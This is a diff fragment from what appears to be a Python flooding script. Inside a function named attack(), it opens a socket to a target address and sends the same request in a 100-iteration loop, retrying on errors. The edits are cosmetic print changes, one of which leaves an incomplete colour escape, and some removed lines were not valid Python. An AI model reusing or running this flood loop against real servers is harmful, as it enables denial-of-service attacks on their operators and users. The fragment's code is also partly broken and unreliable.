@@ -67,10 +67,9 @@ def attack():
       atk.connect((ip, port))
       #star here
       for y in range(100):
-          print()
+          print("\033[33")
           atk.send(str.encode(request))
-          print("http://" +str(ip)"")
-          print(f"\" +str(randip[0])+ """)
+          print("http://" +str(ip)+"")
     except socket.error:
       time.sleep(.1)
     except:
